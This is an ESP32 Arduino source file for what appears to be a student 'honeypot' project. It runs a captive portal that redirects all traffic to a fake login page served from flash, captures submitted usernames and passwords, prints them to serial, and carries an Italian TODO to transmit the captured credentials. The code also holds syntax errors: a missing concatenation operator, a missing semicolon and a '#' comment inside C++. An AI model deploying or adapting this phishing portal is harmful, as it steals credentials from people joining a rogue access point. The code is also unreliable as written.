#include "web_handler.h"

#include <WiFi.h>
#include <WebServer.h>
#include <SPIFFS.h> // used to load page

void setup_web_handler() {
    http_server.on("/", main_handler);
    http_server.on("/submit", submit_handler);
    http_server.on("/shutdown", shutdown_handler);
    http_server.onNotFound(captive_portal);

    // file handlers for use html page from files
    http_server.serveStatic("/styles.css", SPIFFS, "/styles.css");
    http_server.serveStatic("/script.js", SPIFFS, "/script.js");
    http_server.serveStatic("/logo.png", SPIFFS, "/logo.png");
    http_server.serveStatic("/bg.jpg", SPIFFS, "/bg.jpg");
}

void captive_portal() {   
    http_server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
    http_server.send(302, "text/plain", ""); 
}

void main_handler() {
    File file = SPIFFS.open("/index.html", "r");
    if (!file || file.isDirectory()) {
        http_server.send(404, "text/plain", "Login page not found");
        return;
    }
    http_server.streamFile(file, "text/html");
    file.close();
}

void submit_handler() {
    if (http_server.method() == HTTP_POST) {
        String username = http_server.arg("username");
        String password = http_server.arg("password");

        Serial.print("Username: ");
        Serial.println(username);
        Serial.print("Password: ");
        Serial.println(password);

        String to_transmit = username + " - " password
        # TODO: Giuseppe trasmetti la variabile to_transmit se questo concatenamento funziona

        http_server.sendHeader("Location", "/");
        http_server.send(302, "text/plain", "Fake redirection");
    } else {
        http_server.send(405, "text/plain", "Method Not Allowed");
    }
}

void shutdown_handler() {
    http_server.send(200, "text/plain", "Shutting down the Honeypot Unina...");
    delay(1000); 
    ESP.deepSleep(0); 
}
